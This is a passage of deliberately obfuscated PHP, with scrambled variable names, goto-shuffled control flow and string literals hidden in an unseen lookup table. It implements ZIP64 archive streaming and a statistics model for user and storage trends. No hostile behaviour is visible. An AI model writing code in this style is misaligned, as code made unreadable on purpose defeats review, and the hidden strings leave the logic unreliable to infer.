$this->needHeaders = !0; } public function addFile($FƒŞ›“ÉÑ™, $a‡¨ì£¯—) { goto F¯ÅÅ…Š„ª; f»—¾°¤¤: while (!feof($b‡Â„«…š„)) { $FëÔô”Ú…ê = fread($b‡Â„«…š„, 1048576); $this->send($FëÔô”Ú…ê); } fclose($b‡Â„«…š„); $eõîöÔ‰ÎÔ = hexdec(hash_file($B‡àÃØ­É[1971], $a‡¨ì£¯—)); goto eÚÆßŸ«‡é; F¯ÅÅ…Š„ª: $B‡àÃØ­É =& $_SERVER[£ü]; $FƒŞ›“ÉÑ™ = $this->filterFilename($FƒŞ›“ÉÑ™); $aÑ³ó™½Öˆ = static::METHOD_STORE; goto a•¯æÄ§ª¹; eÚÆßŸ«‡é: $this->addFileFooter($FƒŞ›“ÉÑ™, $aÑ³ó™½Öˆ, $eõîöÔ‰ÎÔ, $f‡‘‡‚, $E¦…öàÀ¢, $AŸôˆ¯ñ£…); goto a‘á²¨‡; a•¯æÄ§ª¹: $AŸôˆ¯ñ£… = $this->addFileHeader($FƒŞ›“ÉÑ™, $aÑ³ó™½Öˆ); $f‡‘‡‚ = $E¦…öàÀ¢ = filesize($a‡¨ì£¯—); $b‡Â„«…š„ = fopen($a‡¨ì£¯—, $B‡àÃØ­É[1970]); goto f»—¾°¤¤; a‘á²¨‡: } public function addFileFromStream($DÖĞ­àÁÛ’, $eÆ³ì¥çŸ) { goto b¼…ò´‹¹; C¹¢š‡Ÿ¡½: fseek($eÆ³ì¥çŸ, 0, SEEK_END); $aù‰ó…»à˜ = $Eô¹ÅÅóŞ = ftell($eÆ³ì¥çŸ); rewind($eÆ³ì¥çŸ); goto AÉ¹õÄº›š; b¼…ò´‹¹: $DÖĞ­àÁÛ’ = $this->filterFilename($DÖĞ­àÁÛ’); $Cö ±ññŸ = static::METHOD_STORE; $bâØ‡ÕæÇ = $this->addFileHeader($DÖĞ­àÁÛ’, $Cö ±ññŸ); goto C¹¢š‡Ÿ¡½; AÉ¹õÄº›š: $aÕÓ¾é·Õ© = hash_init($_SERVER[£ü][1971]); while (!feof($eÆ³ì¥çŸ)) { $e²…×ÊØ‹Ì = fread($eÆ³ì¥çŸ, 1048576); hash_update($aÕÓ¾é·Õ©, $e²…×ÊØ‹Ì); $this->send($e²…×ÊØ‹Ì); } $B¬‘ìâèËÆ = hexdec(hash_final($aÕÓ¾é·Õ©)); goto Fë†áëÒ©; Fë†áëÒ©: $this->addFileFooter($DÖĞ­àÁÛ’, $Cö ±ññŸ, $B¬‘ìâèËÆ, $aù‰ó…»à˜, $Eô¹ÅÅóŞ, $bâØ‡ÕæÇ); goto A…ÎÓ›©î; A…ÎÓ›©î: } public function finish() { foreach ($this->files as $D÷Ó°Ÿ¥) { $this->addCdrFile($D÷Ó°Ÿ¥); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($fàŞİâÅ¶©, $FŠ¸™«èä) { goto D´îœ©Ãé; dÈÍïœàé: $E‰´Æñó¢ = $this->dosTime(time()); $E¬Ÿ÷®Ä¼‘ = array(array($DÂÚ†ÇßÆá[1973], static::FILE_HEADER_SIGNATURE), array($DÂÚ†ÇßÆá[1974], static::ZIP_VERSION_64), array($DÂÚ†ÇßÆá[1974], 8), array($DÂÚ†ÇßÆá[1974], $FŠ¸™«èä), array($DÂÚ†ÇßÆá[1973], $E‰´Æñó¢), array($DÂÚ†ÇßÆá[1973], 0), array($DÂÚ†ÇßÆá[1973], 4294967295), array($DÂÚ†ÇßÆá[1973], 4294967295), array($DÂÚ†ÇßÆá[1974], $dˆâóğ•°‚), array($DÂÚ†ÇßÆá[1974], 32)); $cåÑÅ×ç…Ğ = array(array($DÂÚ†ÇßÆá[1974], 1), array($DÂÚ†ÇßÆá[1974], 28), array($DÂÚ†ÇßÆá[1975], 0), array($DÂÚ†ÇßÆá[1975], 0), array($DÂÚ†ÇßÆá[1975], 0), array($DÂÚ†ÇßÆá[1973], 0)); goto FŠ¤÷ˆÏ¦»; D´îœ©Ãé: $DÂÚ†ÇßÆá =& $_SERVER[£ü]; $fàŞİâÅ¶© = preg_replace($DÂÚ†ÇßÆá[1972], $DÂÚ†ÇßÆá[33], $fàŞİâÅ¶©); $dˆâóğ•°‚ = strlen($fàŞİâÅ¶©); goto dÈÍïœàé; FŠ¤÷ˆÏ¦»: $A†ô‰ÁøšŠ = $this->packFields($E¬Ÿ÷®Ä¼‘); $BÅŒÓ¯Ë­  = $this->packFields($cåÑÅ×ç…Ğ); $this->send($A†ô‰ÁøšŠ . $fàŞİâÅ¶© . $BÅŒÓ¯Ë­ ); goto a¬Ç¥ÕŒ; a¬Ç¥ÕŒ: return strlen($A†ô‰ÁøšŠ) + $dˆâóğ•°‚ + strlen($BÅŒÓ¯Ë­ ); goto dÙ†Ëé­Îµ; dÙ†Ëé­Îµ: } protected function addFileFooter($B¡õôÖ–º, $Fœ¸‰º¬œ„, $D†øÚ» ¶, $aš…ìÄ, $EËììŠ²•„, $a÷ØÌçÊÔë) { $d‹÷ÜÖš†Ú =& $_SERVER[£ü]; $bˆÄ‰İå ” = array(array($d‹÷ÜÖš†Ú[1973], static::DATA_DESCRIPTOR_SIGNATURE), array($d‹÷ÜÖš†Ú[1973], $D†øÚ» ¶), array($d‹÷ÜÖš†Ú[1975], $aš…ìÄ), array($d‹÷ÜÖš†Ú[1975], $EËììŠ²•„)); $EÕ÷¡¯ƒîñ = $this->packFields($bˆÄ‰İå ”); $this->send($EÕ÷¡¯ƒîñ); $cÒ‹”Õ³°­ = $a÷ØÌçÊÔë + $aš…ìÄ + $F¨Ì¸Ë½«£; $this->addToCdr($B¡õôÖ–º, $Fœ¸‰º¬œ„, $D†øÚ» ¶, $aš…ìÄ, $EËììŠ²•„, $cÒ‹”Õ³°­); } private function addToCdr($bø¥Ìµ ğ, $bøÀ×‘ìò, $EÂ›¶î‡¡¤, $cãìˆº×–«, $BİŞ†£‡’, $aŒ¼ºä‡«) { $this->files[] = array($bø¥Ìµ ğ, $bøÀ×‘ìò, $EÂ›¶î‡¡¤, $cãìˆº×–«, $BİŞ†£‡’, $this->ofs); $this->ofs += $aŒ¼ºä‡«; } protected function addCdrFile($b„øèŒÖÁ) { goto bÍº°“§³Œ; bò†ìÑáö§: $this->send($d…¡‹Ëíç); $this->cdr_ofs += strlen($d…¡‹Ëíç); goto Bì‘ëß‰ìŠ; bÍº°“§³Œ: $c‘“ÎÆ‘‰š =& $_SERVER[£ü]; list($e•ÁàÏ‘è, $EºáñÖŞ®µ, $e¤áà…™àä, $dËôö×ŒÛ–, $F—¼‡×Ôéò, $EÊãö÷åÈÄ) = $b„øèŒÖÁ; $Bºæä‰ñ¨– = $c‘“ÎÆ‘‰š[33]; goto a¨ÏÖßö¯Ï; DäŠë¤ÄÂè: $E¢ÔĞ–ÏÌ÷ = $this->packFields($c÷áàç¹Ó); $F“Î•­¨ = $this->packFields($A¥¡«Á«Â÷); $d…¡‹Ëíç = $E¢ÔĞ–ÏÌ÷ . $e•ÁàÏ‘è . $Bºæä‰ñ¨– . $F“Î•­¨; goto bò†ìÑáö§; a¨ÏÖßö¯Ï: $d…ÓõŠ³É¡ = $this->dosTime(time()); $c÷áàç¹Ó = array(array($c‘“ÎÆ‘‰š[1973], static::CDR_FILE_SIGNATURE), array($c‘“ÎÆ‘‰š[1974], static::ZIP_VERSION_64), array($c‘“ÎÆ‘‰š[1974], static::ZIP_VERSION_64), array($c‘“ÎÆ‘‰š[1974], 8), array($c‘“ÎÆ‘‰š[1974], $EºáñÖŞ®µ), array($c‘“ÎÆ‘‰š[1973], $d…ÓõŠ³É¡), array($c‘“ÎÆ‘‰š[1973], $e¤áà…™àä), array($c‘“ÎÆ‘‰š[1973], 4294967295), array($c‘“ÎÆ‘‰š[1973], 4294967295), array($c‘“ÎÆ‘‰š[1974], strlen($e•ÁàÏ‘è)), array($c‘“ÎÆ‘‰š[1974], 32), array($c‘“ÎÆ‘‰š[1974], strlen($Bºæä‰ñ¨–)), array($c‘“ÎÆ‘‰š[1974], 0), array($c‘“ÎÆ‘‰š[1974], 0), array($c‘“ÎÆ‘‰š[1973], 32), array($c‘“ÎÆ‘‰š[1973], 4294967295)); $A¥¡«Á«Â÷ = array(array($c‘“ÎÆ‘‰š[1974], 1), array($c‘“ÎÆ‘‰š[1974], 28), array($c‘“ÎÆ‘‰š[1975], $F—¼‡×Ôéò), array($c‘“ÎÆ‘‰š[1975], $dËôö×ŒÛ–), array($c‘“ÎÆ‘‰š[1975], $EÊãö÷åÈÄ), array($c‘“ÎÆ‘‰š[1973], 0)); goto DäŠë¤ÄÂè; Bì‘ëß‰ìŠ: } protected function addCdr64Eof() { goto C–—õ“†ê·; C¿¾«–Û¯†: $this->send($F§©™ÕÄ£î); goto d†¬Ìé«’»; D²——ñÊ¼ñ: $A–„º¨¦Ç÷ = $this->ofs; $d¹½ß¢Ş’Ğ = array(array($cÃ…¬‡æˆ[1973], static::ZIP64_CDR_EOF_SIGNATURE), array($cÃ…¬‡æˆ[1975], 44), array($cÃ…¬‡æˆ[1974], static::ZIP_VERSION_64), array($cÃ…¬‡æˆ[1974], static::ZIP_VERSION_64), array($cÃ…¬‡æˆ[1973], 0), array($cÃ…¬‡æˆ[1973], 0), array($cÃ…¬‡æˆ[1975], $d½Ñå³ĞÁ), array($cÃ…¬‡æˆ[1975], $d½Ñå³ĞÁ), array($cÃ…¬‡æˆ[1975], $cƒªºÂò“˜), array($cÃ…¬‡æˆ[1975], $A–„º¨¦Ç÷)); $F§©™ÕÄ£î = $this->packFields($d¹½ß¢Ş’Ğ); goto C¿¾«–Û¯†; C–—õ“†ê·: $cÃ…¬‡æˆ =& $_SERVER[£ü]; $d½Ñå³ĞÁ = count($this->files); $cƒªºÂò“˜ = $this->cdr_ofs; goto D²——ñÊ¼ñ; d†¬Ìé«’»: } protected function addCdr64Locator() { goto CÄ¸¶ªÛ±¢; A‚Í†±¤®: $this->send($dâø’Üµª‚); goto eê¦”†óƒ; CÄ¸¶ªÛ±¢: $a—×‰«°· =& $_SERVER[£ü]; $D Ú„Ù‹‹É = count($this->files); $d‡é©–Œ©¹ = $this->cdr_ofs; goto b‚Óì³Òİ ; b‚Óì³Òİ : $EÀÃÈÖõÛ§ = $this->ofs; $fŞ¡Á Íª = array(array($a—×‰«°·[1973], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($a—×‰«°·[1973], 0), array($a—×‰«°·[1975], $EÀÃÈÖõÛ§ + $d‡é©–Œ©¹), array($a—×‰«°·[1973], 1)); $dâø’Üµª‚ = $this->packFields($fŞ¡Á Íª); goto A‚Í†±¤®; eê¦”†óƒ: } protected function addCdrEof() { goto a¦§¥áÚ–Ô; f–£‚¯­Ë†: $d¹Œˆåµ— = $this->packFields($bé¢ôËğ“’) . $bÀÄ³ÂŠ”; $this->send($d¹Œˆåµ—); goto b·Ó¿¾œä; bÇÚİïö…: $dë°Û‰ÃĞ = $this->ofs; $bÀÄ³ÂŠ” = $E¾¶¯¹¹§ù[33]; $bé¢ôËğ“’ = array(array($E¾¶¯¹¹§ù[1973], static::CDR_EOF_SIGNATURE), array($E¾¶¯¹¹§ù[1974], 0), array($E¾¶¯¹¹§ù[1974], 0), array($E¾¶¯¹¹§ù[1974], $eçéáëàø˜), array($E¾¶¯¹¹§ù[1974], $eçéáëàø˜), array($E¾¶¯¹¹§ù[1973], 4294967295), array($E¾¶¯¹¹§ù[1973], 4294967295), array($E¾¶¯¹¹§ù[1974], strlen($bÀÄ³ÂŠ”))); goto f–£‚¯­Ë†; a¦§¥áÚ–Ô: $E¾¶¯¹¹§ù =& $_SERVER[£ü]; $eçéáëàø˜ = count($this->files); $Bø½ùŞº® = $this->cdr_ofs; goto bÇÚİïö…; b·Ó¿¾œä: } protected function addCdr() { foreach ($this->files as $A‰‡ï¼ìÖ¥) { $this->addCdrFile($A‰‡ï¼ìÖ¥); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FÔ…Ûƒñ£‰ =& $_SERVER[£ü]; $Dµ‡¹–à = $FÔ…Ûƒñ£‰[199]; if ($this->outputName) { $C¶ÂÕå„§œ = trim(str_replace(array($FÔ…Ûƒñ£‰[113], $FÔ…Ûƒñ£‰[55], $FÔ…Ûƒñ£‰[95], $FÔ…Ûƒñ£‰[67], $FÔ…Ûƒñ£‰[214], $FÔ…Ûƒñ£‰[980]), $FÔ…Ûƒñ£‰[33], $this->outputName)); $C’ÕõùÍ… = rawurlencode($C¶ÂÕå„§œ); $Dµ‡¹–à .= "\x3b\40\146\151\x6c\145\x6e\141\x6d\x65\52\x3d\x75\x74\146\x2d\70\47\47{$C’ÕõùÍ…}"; } $d²çì´Ñ = array($FÔ…Ûƒñ£‰[196] => $FÔ…Ûƒñ£‰[1976], $FÔ…Ûƒñ£‰[1977] => $Dµ‡¹–à, $FÔ…Ûƒñ£‰[1978] => $FÔ…Ûƒñ£‰[1979], $FÔ…Ûƒñ£‰[1980] => $FÔ…Ûƒñ£‰[1981], $FÔ…Ûƒñ£‰[1982] => $FÔ…Ûƒñ£‰[1983]); foreach ($d²çì´Ñ as $AƒÖ ËêëÀ => $EÆÑ¥Œ©„) { header($AƒÖ ËêëÀ . $FÔ…Ûƒñ£‰[870] . $EÆÑ¥Œ©„); } } protected function send($F·˜Ñ‹ßš) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $F·˜Ñ‹ßš); } protected final function dosTime($bÈ“‘Ï¬·) { $DÄ¨§¢„ÅÊ =& $_SERVER[£ü]; $D®ŸâÊò½Í = getdate($bÈ“‘Ï¬·); if ($D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1686]] < 1980) { $D®ŸâÊò½Í = array($DÄ¨§¢„ÅÊ[1686] => 1980, $DÄ¨§¢„ÅÊ[1984] => 1, $DÄ¨§¢„ÅÊ[1985] => 1, $DÄ¨§¢„ÅÊ[1986] => 0, $DÄ¨§¢„ÅÊ[1987] => 0, $DÄ¨§¢„ÅÊ[1988] => 0); } $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1686]] -= 1980; return $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1686]] << 25 | $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1984]] << 21 | $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1985]] << 16 | $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1986]] << 11 | $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1987]] << 5 | $D®ŸâÊò½Í[$DÄ¨§¢„ÅÊ[1988]] >> 1; } protected function packFields($dõ†ìâ‚æÆ) { $FÖø§ßÚ‘ƒ =& $_SERVER[£ü]; $càïóØÆùÙ = $FÖø§ßÚ‘ƒ[33]; $CÇ‡’Öïƒ = array(); foreach ($dõ†ìâ‚æÆ as $b¾ ™Éâ‹ì) { $càïóØÆùÙ .= $b¾ ™Éâ‹ì[0]; $CÇ‡’Öïƒ[] = $b¾ ™Éâ‹ì[1]; } array_unshift($CÇ‡’Öïƒ, $càïóØÆùÙ); return call_user_func_array($FÖø§ßÚ‘ƒ[1989], $CÇ‡’Öïƒ); } protected function filterFilename($D›÷»†…‚²) { $Dáø‡·¥¡É =& $_SERVER[£ü]; return str_replace(array($Dáø‡·¥¡É[95], $Dáø‡·¥¡É[4], $Dáø‡·¥¡É[173], $Dáø‡·¥¡É[69], $Dáø‡·¥¡É[113], $Dáø‡·¥¡É[915], $Dáø‡·¥¡É[918], $Dáø‡·¥¡É[268]), $Dáø‡·¥¡É[70], $D›÷»†…‚²); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($eÀµÔˆÂÇå) { $b­¯µª¤£ø =& $_SERVER[£ü]; $C¨ÀªôÌ¶° = array($b­¯µª¤£ø[531] => array($b­¯µª¤£ø[29] => $b­¯µª¤£ø[1990], $b­¯µª¤£ø[258] => array($b­¯µª¤£ø[207], $b­¯µª¤£ø[689], $b­¯µª¤£ø[1991], $b­¯µª¤£ø[1992])), $b­¯µª¤£ø[1993] => array($b­¯µª¤£ø[29] => $b­¯µª¤£ø[1994], $b­¯µª¤£ø[258] => array($b­¯µª¤£ø[207], $b­¯µª¤£ø[687], $b­¯µª¤£ø[1995], $b­¯µª¤£ø[1996], $b­¯µª¤£ø[1997]))); if (!isset($C¨ÀªôÌ¶°[$eÀµÔˆÂÇå])) { return !1; } $this->optionType = $C¨ÀªôÌ¶°[$eÀµÔˆÂÇå][$b­¯µª¤£ø[29]]; $this->field = $C¨ÀªôÌ¶°[$eÀµÔˆÂÇå][$b­¯µª¤£ø[258]]; return !0; } public function listData($FÎ®•„æ¾­ = false, $Aİ½÷§£Œë = "\155\x6f\144\151\x66\x79\x54\151\155\145", $eÆÙäğ—ó› = false) { return parent::listData($FÎ®•„æ¾­, $Aİ½÷§£Œë, $eÆÙäğ—ó›); } public function trendList($aíøÁ¥—§Ã) { goto A™’¯ñ† Ø; d¥˜áÓñ: if (!isset($D†ñª¼Ö‡µ)) { $f“º‰ù = $aíøÁ¥—§Ã == $E’¾îñµñà[531] ? $E’¾îñµñà[473] : $E’¾îñµñà[748]; $D†ñª¼Ö‡µ = Model($f“º‰ù)->min($E’¾îñµñà[184]); } $Eë¾õ†¬è = $E’¾îñµñà[2000] . ucfirst($aíøÁ¥—§Ã); $f—íÏŠ‹í« = $this->dateList($D†ñª¼Ö‡µ); goto e—¦ÃÁŠÜ‘; A™’¯ñ† Ø: $E’¾îñµñà =& $_SERVER[£ü]; $c¢–ˆÕª¦œ = $this->listData(); if ($c¢–ˆÕª¦œ) { $A•ÄŸÄóÛ = end($c¢–ˆÕª¦œ); $AÇÛ÷Ù®ÅÀ = date($E’¾îñµñà[1998], strtotime($E’¾îñµñà[1999])); if ($A•ÄŸÄóÛ[$E’¾îñµñà[207]] == $AÇÛ÷Ù®ÅÀ) { return $c¢–ˆÕª¦œ; } $D†ñª¼Ö‡µ = strtotime($A•ÄŸÄóÛ[$E’¾îñµñà[207]]); } goto d¥˜áÓñ; e—¦ÃÁŠÜ‘: foreach ($f—íÏŠ‹í« as $AÇÛ÷Ù®ÅÀ) { $this->{$Eë¾õ†¬è}($AÇÛ÷Ù®ÅÀ); } return $this->listData(); goto EğÊÜâÄİ±; EğÊÜâÄİ±: } private function dateList($CË‘‹„½å¹) { $b‹—¤‘ññ =& $_SERVER[£ü]; $eîíâÕ¬ºÓ = $CË‘‹„½å¹; $D­ğÍö¯Œ = strtotime($b‹—¤‘ññ[1999]); $FóµÅÏÃğ = array(); while ($eîíâÕ¬ºÓ <= $D­ğÍö¯Œ) { $FóµÅÏÃğ[] = date($b‹—¤‘ññ[1998], $eîíâÕ¬ºÓ); $eîíâÕ¬ºÓ = strtotime($b‹—¤‘ññ[2001], $eîíâÕ¬ºÓ); } return $FóµÅÏÃğ; } public function _recordUser($CŸ’¡„è‘à = '') { goto C®Ì–Å„ÅŸ; B‹©ˆÈ£«ä: $f’©ÖŒä­ = Model($dÑãöÍó¡™[473])->where($aµš¡¶ÛØ)->count($dÑãöÍó¡™[1401]); $aµš¡¶ÛØ[$dÑãöÍó¡™[29]] = $dÑãöÍó¡™[2004]; $aŸëÅŠ˜²— = Model($dÑãöÍó¡™[2005])->where($aµš¡¶ÛØ)->count($dÑãöÍó¡™[2006]); goto A¸™åºÖ‹; C®Ì–Å„ÅŸ: $dÑãöÍó¡™ =& $_SERVER[£ü]; $Bœ­Ñ¯¼ÛÜ = strtotime(date($dÑãöÍó¡™[2002], strtotime($CŸ’¡„è‘à))); $eÌ±³„Ùë = strtotime(date($dÑãöÍó¡™[2003], strtotime($CŸ’¡„è‘à))); goto C‹Ç˜æ ˆ; A¸™åºÖ‹: $D¬°„£‹Ğè = array($dÑãöÍó¡™[207] => $CŸ’¡„è‘à, $dÑãöÍó¡™[689] => (int) $D„‡ª½‚ÊÚ, $dÑãöÍó¡™[1991] => (int) $f’©ÖŒä­, $dÑãöÍó¡™[1992] => (int) $aŸëÅŠ˜²—); return $this->insert($D¬°„£‹Ğè); goto dÔ°ôÕ¶¨Œ; C‹Ç˜æ ˆ: $aµš¡¶ÛØ = array($dÑãöÍó¡™[184] => array($dÑãöÍó¡™[917], $eÌ±³„Ùë)); $D„‡ª½‚ÊÚ = Model($dÑãöÍó¡™[473])->where($aµš¡¶ÛØ)->count($dÑãöÍó¡™[1401]); $aµš¡¶ÛØ[$dÑãöÍó¡™[184]] = array($dÑãöÍó¡™[318], array($Bœ­Ñ¯¼ÛÜ, $eÌ±³„Ùë)); goto B‹©ˆÈ£«ä; dÔ°ôÕ¶¨Œ: } public function _recordStore($Eñ´½¾­Æ = '') { goto f¦ˆ±ïÜˆ; AËå§ƒÂÇ•: $d‚‡Š•®í”[$c˜¢—½ğßì[368]] = 1; $D”Á­´¯® = Model($c˜¢—½ğßì[748])->where($d‚‡Š•®í”)->sum($c˜¢—½ğßì[77]); $d‚‡Š•®í”[$c˜¢—½ğßì[368]] = 2; goto AÀÂ¦³†Ì¶; F‹÷¿©ö·É: $BèÙ‡êâ¼‰ = Model($c˜¢—½ğßì[418])->where($d‚‡Š•®í”)->sum($c˜¢—½ğßì[77]); $d‚‡Š•®í”[$c˜¢—½ğßì[367]] = 0; $eÙä®ß‚‰ï = Model($c˜¢—½ğßì[748])->where($d‚‡Š•®í”)->sum($c˜¢—½ğßì[77]); goto AËå§ƒÂÇ•; AÀÂ¦³†Ì¶: $CİÓíéÓ¥ = Model($c˜¢—½ğßì[748])->where($d‚‡Š•®í”)->sum($c˜¢—½ğßì[77]); $Añæ¿”ŒÚĞ = array($c˜¢—½ğßì[207] => $Eñ´½¾­Æ, $c˜¢—½ğßì[687] => (int) $eÙä®ß‚‰ï, $c˜¢—½ğßì[1995] => (int) $BèÙ‡êâ¼‰, $c˜¢—½ğßì[1996] => (int) $D”Á­´¯®, $c˜¢—½ğßì[1997] => (int) $CİÓíéÓ¥); return $this->insert($Añæ¿”ŒÚĞ); goto e¸¸¹×Õ¹; f¦ˆ±ïÜˆ: $c˜¢—½ğßì =& $_SERVER[£ü]; $c»»ŒÚ‘™ = strtotime(date($c˜¢—½ğßì[2003], strtotime($Eñ´½¾­Æ))); $d‚‡Š•®í” = array($c˜¢—½ğßì[184] => array($c˜¢—½ğßì[917], $c»»ŒÚ‘™)); goto F‹÷¿©ö·É; e¸¸¹×Õ¹: } public function trend($fèŒ¯å½ÅÜ, $B¦¬ã“†®) { goto dÏèÈ…îí“; CÊ¼¦·ÕÔ: if ($c—‡Ş¤‹®í && $B¦¬ã“†® != $AÌ­Ğ••[1376]) { $Dïªø…”èñ = $c—‡Ş¤‹®í[0][$AÌ­Ğ••[207]]; $E›Ü‚Åëé– = $this->validDate($B¦¬ã“†®, $Dïªø…”èñ); $CÉ“™¼Ê² = array(); $Aöâ†»„º´ = array_to_keyvalue($c—‡Ş¤‹®í, $AÌ­Ğ••[207]); foreach ($E›Ü‚Åëé– as $A¹‘ƒùÂÜ£) { if (isset($Aöâ†»„º´[$A¹‘ƒùÂÜ£])) { $Aàğ­ÃÊ¹¼ = $Aöâ†»„º´[$A¹‘ƒùÂÜ£]; } else { $Aàğ­ÃÊ¹¼ = end($c—‡Ş¤‹®í); $Aàğ­ÃÊ¹¼[$AÌ­Ğ••[207]] = $A¹‘ƒùÂÜ£; if ($fèŒ¯å½ÅÜ == $AÌ­Ğ••[531]) { $Aàğ­ÃÊ¹¼[$AÌ­Ğ••[1991]] = $Aàğ­ÃÊ¹¼[$AÌ­Ğ••[1992]] = 0; } } $CÉ“™¼Ê²[] = $Aàğ­ÃÊ¹¼; } $c—‡Ş¤‹®í = $CÉ“™¼Ê²; } $DÈÖÉä«˜ = array($AÌ­Ğ••[531] => array($AÌ­Ğ••[689] => LNG($AÌ­Ğ••[2007]), $AÌ­Ğ••[1991] => LNG($AÌ­Ğ••[2008]), $AÌ­Ğ••[1992] => LNG($AÌ­Ğ••[2009])), $AÌ­Ğ••[1993] => array($AÌ­Ğ••[687] => LNG($AÌ­Ğ••[2010]), $AÌ­Ğ••[1995] => LNG($AÌ­Ğ••[2011]), $AÌ­Ğ••[1996] => LNG($AÌ­Ğ••[2012]), $AÌ­Ğ••[1997] => LNG($AÌ­Ğ••[2013]))); $f ÈÏ­Í ¤ = array($AÌ­Ğ••[531] => $AÌ­Ğ••[2014], $AÌ­Ğ••[1993] => $AÌ­Ğ••[77]); goto d®“·ã·Û; dÏèÈ…îí“: $AÌ­Ğ•• =& $_SERVER[£ü]; if (!$this->init($fèŒ¯å½ÅÜ)) { return !1; } $c—‡Ş¤‹®í = $this->trendList($fèŒ¯å½ÅÜ); goto CÊ¼¦·ÕÔ; d®“·ã·Û: if (empty($c—‡Ş¤‹®í)) { $A¹‘ƒùÂÜ£ = date($AÌ­Ğ••[1998], strtotime($AÌ­Ğ••[1999])); $aàİ¨ÚÎ = array($AÌ­Ğ••[207] => $A¹‘ƒùÂÜ£); foreach ($DÈÖÉä«˜[$fèŒ¯å½ÅÜ] as $d“¹†ƒçÊ => $EçáÓ¡Õí) { $aàİ¨ÚÎ[$d“¹†ƒçÊ] = 0; } $c—‡Ş¤‹®í[] = $aàİ¨ÚÎ; } $d”Ä©¹Ïƒ = array(); foreach ($c—‡Ş¤‹®í as $EçáÓ¡Õí) { if ($fèŒ¯å½ÅÜ == $AÌ­Ğ••[1993] && $EçáÓ¡Õí[$AÌ­Ğ••[1995]] > $EçáÓ¡Õí[$AÌ­Ğ••[687]]) { $EçáÓ¡Õí[$AÌ­Ğ••[1995]] = $EçáÓ¡Õí[$AÌ­Ğ••[687]]; } foreach ($DÈÖÉä«˜[$fèŒ¯å½ÅÜ] as $d“¹†ƒçÊ => $a…«›’Œ²) { $Aàğ­ÃÊ¹¼ = array($AÌ­Ğ••[207] => $EçáÓ¡Õí[$AÌ­Ğ••[207]], $AÌ­Ğ••[1309] => $a…«›’Œ²); $Aàğ­ÃÊ¹¼[$f ÈÏ­Í ¤[$fèŒ¯å½ÅÜ]] = isset($EçáÓ¡Õí[$d“¹†ƒçÊ]) ? $EçáÓ¡Õí[$d“¹†ƒçÊ] : 0; $d”Ä©¹Ïƒ[] = $Aàğ­ÃÊ¹¼; } } goto BÖé‚ï ±¸; BÖé‚ï ±¸: return $d”Ä©¹Ïƒ; goto eÑà·ƒÙé; eÑà·ƒÙé: } public function validDate($AÖÌÏìÓ¸, $c–àˆÍ°ÈÆ) { goto fªÑ„İµ; A²ø×¾¢¡: switch ($AÖÌÏìÓ¸) { case $d¾¤æ£”‰[1383]: $bô‚êŠêÉ = mktime(0, 0, 0, date($d¾¤æ£”‰[2015]), date($d¾¤æ£”‰[2016]) - date($d¾¤æ£”‰[1208]) + 7 - 7, date($d¾¤æ£”‰[2017])); $Aœ´òĞô™ = 0; do { $B¤ŒóÌøÚ = date($d¾¤æ£”‰[1998], $bô‚êŠêÉ - 3600 * 24 * 7 * $Aœ´òĞô™); $C‚ÁõŠÖÛ[] = $B¤ŒóÌøÚ; $Aœ´òĞô™++; } while ($c–àˆÍ°ÈÆ < $B¤ŒóÌøÚ); break; case $d¾¤æ£”‰[1381]: $Aœ´òĞô™ = 1; do { $Bš±òó¹—“ = date($d¾¤æ£”‰[2018], strtotime("\x2d\40{$Aœ´òĞô™}\x20\x6d\x6f\156\164\150\x73")); $C‚ÁõŠÖÛ[] = $Bš±òó¹—“; $Aœ´òĞô™++; } while ($c–àˆÍ°ÈÆ < $Bš±òó¹—“); break; case $d¾¤æ£”‰[1686]: $dì’—­ÃÅÊ = (int) date($d¾¤æ£”‰[2017], strtotime($c–àˆÍ°ÈÆ)); $eÍŒ¨¹‹˜ = (int) date($d¾¤æ£”‰[2017]); if ($dì’—­ÃÅÊ >= $eÍŒ¨¹‹˜) { break; } for ($dì’—­ÃÅÊ; $dì’—­ÃÅÊ < $eÍŒ¨¹‹˜; $dì’—­ÃÅÊ++) { $C‚ÁõŠÖÛ[] = $dì’—­ÃÅÊ . $d¾¤æ£”‰[2019]; } break; default: break; } if ($c–àˆÍ°ÈÆ > end($C‚ÁõŠÖÛ)) { array_pop($C‚ÁõŠÖÛ); } sort($C‚ÁõŠÖÛ); goto FäÆÉãô¡à; fªÑ„İµ: $d¾¤æ£”‰ =& $_SERVER[£ü]; $AàŠëŒ·±À = date($d¾¤æ£”‰[1998], strtotime($d¾¤æ£”‰[1999])); $C‚ÁõŠÖÛ = array($AàŠëŒ·±À); goto A²ø×¾¢¡; FäÆÉãô¡à: return $C‚ÁõŠÖÛ; goto dŠÓàæ²Ó©; dŠÓàæ²Ó©: } public function listTable($f¥å¸¾”ƒË) { $F×¹ÜÒ»‹ = ucfirst($f¥å¸¾”ƒË); return Model($F×¹ÜÒ»‹)->listData(); } public function option($a¨‚ö½­ò) { $e´ë‡Áƒ»Ø = $_SERVER[£ü][2020] . ucfirst($a¨‚ö½­ò); return $this->{$e´ë‡Áƒ»Ø}(); } private function optionUser() { goto Eî¬È„Ù–ê; bÉÖ«îä‘: $E³œÃ »» = Model($BØ‚£„ö±·[473])->where($eßÃÖ‰òê°)->count($BØ‚£„ö±·[1401]); return array($BØ‚£„ö±·[684] => (int) $dìÊ¿å¤È, $BØ‚£„ö±·[2024] => (int) ($dìÊ¿å¤È - $dæŠæ¡¹óœ), $BØ‚£„ö±·[2025] => (int) $dæŠæ¡¹óœ, $BØ‚£„ö±·[2026] => (int) $E³œÃ »», $BØ‚£„ö±·[2027] => $D¡Ğê®è¿ç); goto aĞÈË¯ñİ; Eî¬È„Ù–ê: $BØ‚£„ö±· =& $_SERVER[£ü]; $dìÊ¿å¤È = 